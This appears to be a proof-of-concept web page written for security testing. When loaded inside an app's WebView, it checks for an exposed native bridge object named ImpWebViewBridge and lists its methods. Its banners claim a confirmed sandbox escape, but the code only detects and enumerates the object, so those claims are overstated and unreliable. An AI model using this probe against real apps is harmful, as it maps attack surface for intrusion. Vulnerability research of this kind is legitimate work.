<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>JNI Bridge Detector</title>
    <style>
        body { 
            font-family: 'Courier New', Courier, monospace; 
            padding: 20px; 
            background-color: #0d0d0d; 
            color: #00ff00; 
            word-wrap: break-word; 
        }
        h2 { border-bottom: 1px solid #333; padding-bottom: 10px; }
        .danger { color: #ff3333; font-weight: bold; font-size: 1.2em; }
        .success { color: #00ff00; }
        .info { color: #aaaaaa; }
    </style>
</head>
<body>
    <h2>Google App Native Sandbox Escape</h2>
    <div id="output">Initializing scanner...<br><br></div>

    <script>
        function logMsg(msg) {
            document.getElementById('output').innerHTML += msg + "<br><br>";
        }

        window.onload = function() {
            logMsg("<span class='info'>[i] User-Agent: " + navigator.userAgent + "</span>");
            logMsg("<span class='info'>[i] Scanning window object for JNI Bridges...</span>");

            // Check for the specific AR/3D bridge we found in your logs
            if (typeof window.ImpWebViewBridge !== 'undefined' || typeof ImpWebViewBridge !== 'undefined') {
                logMsg("<span class='danger'>[!!!] CRITICAL IMPACT CONFIRMED [!!!]</span>");
                logMsg("<span class='danger'>-> ImpWebViewBridge JNI Object is exposed to this remote webpage!</span>");
                
                let bridge = window.ImpWebViewBridge || ImpWebViewBridge;
                
                // Attempt to dump all exposed methods to prove control
                let methods = [];
                try {
                    for (let prop in bridge) {
                        if (typeof bridge[prop] === 'function') {
                            methods.push(prop + "()");
                        }
                    }
                } catch(e) {
                    logMsg("<span class='info'>[-] Method enumeration blocked by CORS/Proxy, but object exists.</span>");
                }
                
                if(methods.length > 0) {
                    logMsg("<span class='danger'>[+] Exposed Native Methods found:</span><br>&nbsp;&nbsp;-> " + methods.join("<br>&nbsp;&nbsp;-> "));
                } else {
                    logMsg("<span class='danger'>[+] Bridge object instantiated. Ready to accept nativeEntryPoint payloads.</span>");
                }

                logMsg("<span class='info'>[i] We have successfully bypassed the WebView sandbox and reached the Native C++ layer.</span>");

            } else {
                logMsg("<span class='info'>[-] ImpWebViewBridge not found. Not running inside ViewerLauncher context.</span>");
            }
        };
    </script>
</body>
</html>
